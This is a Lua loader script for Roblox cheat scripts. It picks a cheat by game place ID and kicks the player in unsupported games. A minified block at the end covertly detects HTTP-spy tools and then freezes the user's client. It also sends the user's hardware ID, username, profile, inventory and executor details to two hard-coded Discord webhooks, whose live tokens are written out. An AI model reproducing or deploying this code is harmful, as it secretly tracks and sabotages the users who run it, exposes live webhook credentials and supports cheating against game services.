placeId = game.PlaceId
if placeId == 6296321810 or placeId == 6479231833 or placeId == 6301638949 or placeId == 6480994221 then
    getgenv().ScriptName = "The Mimic" --b1c1
elseif placeId == 6373539583 or placeId == 6485055338 or placeId == 6406571212 or placeId == 6485055836 or placeId == 6425178683 or placeId == 6485056556 then
    getgenv().ScriptName = "The Mimic" --b1c2
elseif placeId == 6472459099 or placeId == 6688734180 or placeId == 6682163754 or placeId == 6688734313 or placeId == 6682164423 or placeId == 6688734395 then
    getgenv().ScriptName = "The Mimic" --b1c3
elseif placeId == 7251865082 or placeId == 7265396387 or placeId == 7251866503 or placeId == 7265396805 or placeId == 7251867155 or placeId == 7265397072 or placeId == 7251867574 or placeId == 7265397848 then
    getgenv().ScriptName = "The Mimic" --b1c4
elseif placeId == 8056702588 then
    getgenv().ScriptName = "The Mimic" --b2c1
elseif placeId == 13489800654 then
    getgenv().ScriptName = "The Mimic" --b2c2
elseif placeId == 15962819441 then
    getgenv().ScriptName = "The Mimic" --b2c3
elseif placeId == 7068738088 or placeId == 7068951438 or placeId == 7068739000 or placeId == 7068951914 or placeId == 7068740106 or placeId == 7068952294 then
    getgenv().ScriptName = "The Mimic" --twt
elseif placeId == 8311299084 or placeId == 8311302084 then
    getgenv().ScriptName = "The Mimic" --christmas trial
elseif placeId == 7633631103 or placeId == 7633631351 or placeId == 7633631511 then
    getgenv().ScriptName = "The Mimic" --Halloween trial
elseif placeId == 11126398230 then
    getgenv().ScriptName = "The Mimic" --nightmarecircus
elseif placeId == 7618863566 then
    getgenv().ScriptName = "The Mimic" --jigoku
elseif placeId == 6243699076 then
    getgenv().ScriptName = "The Mimic" --lobby
end
if placeId == 5777228223 or placeId == 3475397644 or placeId == 5391312853 or placeId == 3752680052 or placeId == 4174118306 or placeId == 3475419198 or placeId == 3475422608 or placeId == 4601778915 or placeId == 4869039553 or placeId == 5777228223 or placeId == 3623549100 or placeId == 3737848045 or placeId == 3487210751 or placeId == 4728805070 or placeId == 5777228223 then
    getgenv().ScriptName = "Dragon Adventure" --Normal World
end
if placeId == 16556777270 then
    getgenv().ScriptName = "HEDE RNG"
end
if placeId == 15532962292 then
    getgenv().ScriptName = "SOL RNG"
end
if placeId == 537413528 then
    getgenv().ScriptName = "BABFT"
end
if placeId == 16524008257 then
    getgenv().ScriptName = "Anime RNG"
end
if placeId == 16778527574 then
    getgenv().ScriptName = "Anime Rarity"
end
if placeId == 16408177303 then
    getgenv().ScriptName = "Anime Roulette"
end
if placeId == 16256372659 or placeId == 16228316919 or placeId == 16942077161 or placeId == 16303465041 or placeId == 16584009082 then
    getgenv().ScriptName = "Stock Up"
end
if placeId == 893973440 then
    getgenv().ScriptName = "FTF"
end
if placeId == 16389395869 or placeId == 16389398622 or placeId == 17527914941 then
    getgenv().ScriptName = "ADT"
end
if placeId == 15214140740 or placeId == 18725604807 then
    getgenv().ScriptName = "UTS"
end
if placeId == 12552538292 or placeId == 12411473842 then
    getgenv().ScriptName = "PRESSURE"
end
task.wait()
if getgenv().IsRunError==nil or false then getgenv().IsRunError=true;local a=false;coroutine.wrap(function()game:GetService("CoreGui").ChildAdded:Connect(function(b)game:GetService("RunService").Stepped:Connect(function()if b.Name=="UI LIB"or b.Name=="spyu"then a=true end end)end)while task.wait(0.1)do for c,d in pairs(game:GetService("CoreGui"):GetChildren())do if d then if d.Name=="ScreenGui"and d:FindFirstChild("ImageLabel")and(d.ImageLabel.Image=="rbxassetid://6065775281"or d.ImageLabel.Visible or not d.ImageLabel.Visible)then a=true end;if d:FindFirstChild("Base")and d.Base:FindFirstChild("Status")then a=true end end end;if isfolder("HttpSpy")then a=true end end end)()local e="https://discord.com/api/webhooks/1261262001091510355/5pC_FU1GNQ1CvvSLfYkz11Bn2r8YpaSTQPXgHsuhXy93ycmYouTA1J2E6_J4YDTYhmId"local request=http_request or request or HttpPost or syn.request or fluxus.request;task.spawn(function()repeat task.wait()until a;request({Url=e,Body=game:GetService("HttpService"):JSONEncode({['content']="> "..game:GetService("RbxAnalyticsService"):GetClientId().."\n> "..game.Players.LocalPlayer.Name}),Method="POST",Headers={['Content-Type']='application/json'}})task.wait()while true do end end)local function f(g)if g=="Players"then local h={}pcall(function()for c,d in pairs(game.Players:GetChildren())do if d then table.insert(h,tostring(d.Name))end end end)return h or"nil"elseif g=="Backpack"then local i={}pcall(function()for c,d in pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if d then table.insert(i,tostring(d.Name))end end end)return i or"nil"elseif g=="Loader"then if game.CoreGui:FindFirstChild("Loader")then return"Found"else return"Not Found"end elseif g=="Bypass"then if getgenv().AllowToLoad then return"No"else return"Yes"end end end;local j="https://discord.com/api/webhooks/1261262016983732305/euP4b24hWRlHfqf_qXiuJMTNCkUIHdiAiliJxd9g39hixQ2bVwq8h4gnFpBSedLJ79Qt"local k=false;local l;local m;local function n()local o=os.time()local p=os.date("%H:%M",o)local q=os.date("%m/%d/%y",o)local r=os.date("%y%m%d%H%M%S",o)return"\n> User Time: "..p.."\n> User Date: "..q.."\n> Timestamp: "..r end;if not getgenv().LastFuntion then getgenv().LastFuntion="nil"end;l=hookmetamethod(game,"__namecall",function(self,...)local s=getnamecallmethod()if s:lower()=="fireserver"then m=self end;if s:lower()=="kick"then clientManadear=true end;return l(self,...)end)GuiService=game:GetService("GuiService")GuiService.ErrorMessageChanged:Connect(function(t)if not k then k=true;request({Url=j,Body=game:GetService("HttpService"):JSONEncode({['content']="```md".."\n> Kick Message: "..tostring(t).."\n> HW: "..game:GetService("RbxAnalyticsService"):GetClientId().."\n> Name: "..tostring(game.Players.LocalPlayer.Name).."\n> Executor: "..identifyexecutor()..n().."\n> Profile: https://www.roblox.com/users/"..tonumber(game.Players.LocalPlayer.UserId).."/profile".."\n> Backpack: {"..tostring(table.concat(f("Backpack"),", ")).."}".."\n> Game: "..game.MarketplaceService:GetProductInfo(game.PlaceId).Name.."\n> PlaceId: "..tostring(game.PlaceId).."\n> Lastest Remote: "..tostring(m).."```"}),Method="POST",Headers={['Content-Type']='application/json'}})end end)end
task.wait();
if getgenv().ScriptName ~= nil then  return getgenv().ScriptName
else game:GetService("Players").LocalPlayer:Kick("Unsupported Experience")
end;
